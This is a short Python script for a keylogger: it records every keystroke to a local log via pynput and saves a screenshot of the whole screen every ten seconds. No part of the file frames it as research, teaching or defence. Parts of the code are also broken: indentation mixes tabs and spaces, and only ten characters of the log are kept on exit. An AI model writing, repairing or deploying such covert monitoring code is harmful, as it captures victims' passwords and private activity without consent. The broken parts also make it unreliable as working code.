from multiprocessing import Process
from pynput import keyboard
import pyscreenshot as ImageGrab
import time, datetime, sys, os

LOG_FILE = os.getcwd() + '/keys.log'
TEMP_FILE = os.getcwd() + '/temp.log'

def getDir():
	os.getcwd()
	try:
		os.chdir('screenshots')
	except FileNotFoundError:
		os.mkdir('screenshots')
		os.chdir('screenshots')

def getTime():
	st = time.strftime('%H:%M:%S_%Y-%m-%d.png')
	return st

def keyPress(key):
    with open(TEMP_FILE,'a') as f:
	    try:
	    	if key.char != None:
	        	f.write(key.char)
	    except AttributeError:
	        if key == keyboard.Key.space:
	            f.write(' ')
	        elif key == keyboard.Key.backspace:
	        	f.write(str(key) + '\n')
	        elif key == keyboard.Key.enter:
	        	f.write('\n')
	       	else:
	       		try:
	       			pass
	       		except KeyboardInterrupt:
	       			print('Bye')
	       			sys.exit(0)

def takeScreenShot():
	var = 1
	getDir()
	while var == 1:
		im = ImageGrab.grab()
		ts = getTime()
		im.save(ts)
		time.sleep(10)

def keyLogging():
	with keyboard.Listener(on_press=keyPress) as listener:
		listener.join()

if __name__=='__main__':
	screenshot = Process(target = takeScreenShot)
	screenshot.start()
	keylog = Process(target = keyLogging)
	keylog.start()

	try:
		while True:
			pass
	except KeyboardInterrupt:
		with open(LOG_FILE, 'a') as f:
			r = open(TEMP_FILE,'r')
			str = r.read(10)
			f.write('######' + time.strftime('%H:%M:%S_%Y-%m-%d') + '######\n\n')
			f.write(str)
			r.close()
			os.remove(TEMP_FILE)
		print('Terminating Processes')
		screenshot.terminate()
		keylog.terminate()
		print('Processes Terminated')
		print('System Exiting')
		sys.exit(0)